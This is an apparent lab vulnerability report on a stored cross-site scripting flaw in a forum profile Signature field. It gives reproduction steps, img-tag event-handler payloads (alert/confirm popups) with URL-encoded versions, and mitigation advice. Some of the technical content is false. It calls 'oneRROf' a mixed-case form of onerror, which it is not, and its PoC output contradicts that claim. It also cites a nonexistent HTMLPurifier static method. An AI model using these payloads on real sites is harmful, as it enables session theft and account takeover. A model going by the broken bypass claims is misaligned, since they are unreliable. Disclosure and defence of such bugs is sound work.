# Stored Cross-Site Scripting (XSS) - Acronis Forum Profile Signature

## Summary

I identified a Stored Cross-Site Scripting (XSS) vulnerability in the Profile Signature functionality of the Acronis Forum application.

The application accepts user-controlled input through the **Signature** field in the user profile settings and stores it in the database without proper sanitization or output encoding. When other users view the user's profile or forum posts, the injected malicious code is rendered and executed in their browsers. By injecting an `<img>` tag with an `oneRROf` event handler (a mixed-case variation of `onerror`), arbitrary code execution is achieved.

An attacker can update their profile signature with a malicious payload that, when viewed by other users, executes arbitrary JavaScript in the context of the vulnerable application. The injected payload is persistently stored in the database and affects all users who view the profile or forum posts.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Stored (Persistent)**

## Vulnerable Parameters

```text
Signature
Display Name
About Me
```

## Vulnerable URL

```text
https://kzlabs.in/62.php
```

## Steps to Reproduce

1. Navigate to the vulnerable forum page at `https://kzlabs.in/62.php`.

2. Click on **My Profile** in the navigation menu.

3. Locate the **Signature** field in the PROFILE SIGNATURE section.

4. Enter the following payload in the **Signature** field:

   ```text
   ""> <img src=x oneRROf=alert(150) >
   ```

5. Click the **Save Profile** button to save the changes.

6. Navigate back to the forum questions page where the signature is displayed.

7. Observe that the browser executes the injected payload and displays an `alert(150)` popup.

## Payloads Used

```text
Signature: ""> <img src=x oneRROf=alert(150) >
Signature: ">anil<IMg SRc=x ONeRRor=confirm(200)>
```

URL-encoded versions:
```text
%22%22%3E%20%3Cimg%20src%3Dx%20oneRROf%3Dalert%28150%29%20%3E
%22%3Eanil%3CIMg%20SRc%3Dx%20ONeRRor%3Dconfirm%28200%29%3E
```

## Proof of Concept

The application accepts the value of the Signature field and stores it in the database without proper sanitization. When profiles or forum posts are displayed, the user-controlled input is rendered directly into the page HTML.

The payload works by:
1. Breaking out of the existing HTML context using `">`
2. Injecting an `<img>` tag with mixed-case formatting to evade case-sensitive filters
3. Using `oneRROf` (a mixed-case variation of `onerror`) as the event handler
4. The `onerror` event triggers when the image fails to load (due to `src=x`, where `x` is an invalid source)
5. This executes the JavaScript `alert(150)` and `confirm(200)`, displaying popups

```html
<!-- Injected payload rendered in the page: -->
"><img src="x" onerror="alert(150)">
"><img src="x" onerror="confirm(200)">
```

The payload is persistently stored and executed every time a user views the profile or forum posts.

<img width="1436" height="1079" alt="Screenshot 2026-08-14 204659" src="https://github.com/user-attachments/assets/7ad49bf3-07a9-42ce-96b0-f167f337134a" />

<img width="1401" height="622" alt="Screenshot 2026-08-14 204541" src="https://github.com/user-attachments/assets/6bf1078e-7c93-44c8-b346-5a492474def3" />

## Impact

Stored XSS vulnerabilities in forum/profile systems are highly critical because:

- **Persistent**: Malicious payloads are permanently stored in the database
- **Widespread Impact**: All users viewing profiles or forum posts are affected
- **No User Interaction Required**: Victims don't need to click a malicious link
- **High Trust Context**: Signatures are displayed across multiple pages
- **Community Impact**: Forums often have large user bases

An attacker can:

- Steal session cookies and hijack user accounts of all viewers
- Perform actions on behalf of authenticated users
- Deface forum pages or manipulate content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information
- Create self-propagating worms through forum posts
- Conduct phishing attacks within the trusted domain
- Escalate privileges by targeting administrators
- Distribute malware through trusted forum pages

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
  ```php
  echo htmlspecialchars($signature, ENT_QUOTES, 'UTF-8');
  ```

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes.
  ```php
  $clean_signature = HTMLPurifier::sanitize($_POST['signature']);
  ```

- **Input Validation**: Validate and sanitize all user inputs before storing. Consider using a whitelist approach to allow only safe content.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts, event handlers, and unauthorized script sources.

- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).

- **Case-Insensitive Filtering**: Use case-insensitive pattern matching to filter malicious content.

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **Input Length Limits**: Enforce reasonable length limits on the signature field.

- **Regular Security Audits**: Conduct regular assessments and code reviews to identify vulnerabilities.

---
